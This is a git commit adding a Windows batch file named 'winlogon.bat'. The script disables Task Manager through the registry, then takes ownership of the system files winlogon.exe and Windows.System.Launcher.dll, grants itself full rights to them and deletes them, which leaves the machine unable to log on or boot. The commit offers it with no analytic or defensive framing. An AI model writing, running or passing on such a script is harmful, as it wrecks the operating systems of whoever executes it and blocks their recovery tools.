4207b980039f266bdedc63480e5c43d7858c09f2
Hunterhud <125219909+Hunterhud@users.noreply.github.com>
2025-04-27 17:28:08 -0700

    Add files via upload

---
+++ winlogon.bat
@@ -0,0 +1,9 @@
+@echo off
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+takeown /f "C:\Windows\System32\winlogon.exe"
+icacls "C:\Windows\System32\winlogon.exe" /grant administrator:F
+del /F /S /Q "C:\Windows\System32\winlogon.exe" 
+timeout /t 2 NOBREAK >nul
+takeown /f "C:\Windows\SysWOW64\Windows.System.Launcher.dll" 
+icacls "C:\Windows\SysWOW64\Windows.System.Launcher.dll" /grant administrator:F
+del /F /S /Q "C:\Windows\SysWOW64\Windows.System.Launcher.dll"
